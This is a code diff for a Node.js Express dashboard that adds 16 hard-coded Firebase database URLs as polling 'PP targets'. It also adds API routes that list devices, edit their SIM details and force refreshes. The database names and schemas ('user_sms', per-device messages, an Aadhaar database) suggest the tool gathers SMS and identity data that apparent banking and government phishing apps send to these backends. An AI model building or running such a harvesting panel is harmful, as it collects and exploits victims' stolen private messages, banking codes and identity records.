@@ -214,7 +214,32 @@ const TARGETS = RAW_TARGETS.map(([id, url]) => ({
   id, url: url.replace(/\/$/, ''), schema: getSchema(id), isOld: false
 }));
 
-const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS];
+// ── PP RAW_TARGETS (deduplicated by DB URL, dead URLs excluded) ───────────────
+// Schemas: 2 = clients+/messages/<did>, 9 = user_data+user_sms, 14 = merged
+const PP_RAW_TARGETS = [
+  [101, 'https://spnew-d98bc-default-rtdb.firebaseio.com',     2],
+  [102, 'https://yono-c281d-default-rtdb.firebaseio.com',      9],
+  [103, 'https://sbifinal-4b241-default-rtdb.firebaseio.com',  2],
+  [104, 'https://seccc-3702a-default-rtdb.firebaseio.com',     2],
+  [105, 'https://sexysp-d898c-default-rtdb.firebaseio.com',    2],
+  [106, 'https://sex-panel-default-rtdb.firebaseio.com',       2],
+  [107, 'https://mr-noob-6090d-default-rtdb.firebaseio.com',   2],
+  [108, 'https://styliish-b4fb9-default-rtdb.firebaseio.com',  2],
+  [109, 'https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com', 2],
+  [110, 'https://newonline-f39b7-default-rtdb.firebaseio.com', 2],
+  [111, 'https://apknetapp-default-rtdb.firebaseio.com',       4],
+  [112, 'https://kwala-de51b-default-rtdb.firebaseio.com',     2],
+  [113, 'https://new-m-parivahan-default-rtdb.firebaseio.com', 2],
+  [114, 'https://masterp-26fbb-default-rtdb.firebaseio.com',   2],
+  [115, 'https://arjunallcc-27e4d-default-rtdb.firebaseio.com',14],
+  [116, 'https://max2-1aa49-default-rtdb.firebaseio.com',      2],
+];
+
+const PP_TARGETS = PP_RAW_TARGETS.map(([id, url, schema]) => ({
+  id, url: url.replace(/\/$/, ''), schema, isOld: false, isPP: true
+}));
+
+const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS];
 
 // ── Dashboard DB: load / save ─────────────────────────────────────────────────
 // Structure: { new: { [targetId]: { [deviceId]: deviceRecord } },
@@ -231,6 +256,7 @@ function loadDashboardDb() {
   // Ensure both sections exist
   if (!dashboardDb.new) dashboardDb.new = {};
   if (!dashboardDb.old) dashboardDb.old = {};
+  if (!dashboardDb.pp)  dashboardDb.pp  = {};
 }
 
 function saveDashboardDb() {
@@ -242,7 +268,7 @@ function saveDashboardDb() {
 }
 
 function getTargetDb(target) {
-  const section = target.isOld ? 'old' : 'new';
+  const section = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
   const key = String(target.id);
   if (!dashboardDb[section][key]) dashboardDb[section][key] = {};
   return dashboardDb[section][key];
@@ -813,10 +839,42 @@ app.get('/api/old/url/:id', (req, res) => {
   res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
 });
 
+// ── PP URLs API routes ────────────────────────────────────────────────────────
+app.get('/api/pp/urls', (req, res) => {
+  const summaries = PP_TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
+  res.json(summaries);
+});
+
+app.get('/api/pp/url/:id', (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = PP_TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+  const devices      = getTargetDb(target);
+  const simOverrides = loadSimOverrides();
+  const aadharDb     = loadAadharDb();
+  const deviceList   = buildDeviceList(target, devices, simOverrides, aadharDb);
+  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
+});
+
+app.post('/api/pp/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
+  const { urlId, deviceId } = req.params;
+  const { sim1, sim2 } = req.body;
+  const overrides = loadSimOverrides();
+  const key = `pp_${urlId}`;
+  if (!overrides[key]) overrides[key] = {};
+  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
+  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
+  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
+  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
+    delete overrides[key][deviceId];
+  saveSimOverrides(overrides);
+  res.json({ ok: true });
+});
+
 // ── Force-refresh a single target immediately ─────────────────────────────────
 app.post('/api/url/:id/refresh', async (req, res) => {
   const id = parseInt(req.params.id);
-  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id);
+  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id) || PP_TARGETS.find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'Not found' });
   await pollTarget(target);
   res.json({ ok: true, devices: Object.keys(getTargetDb(target)).length });
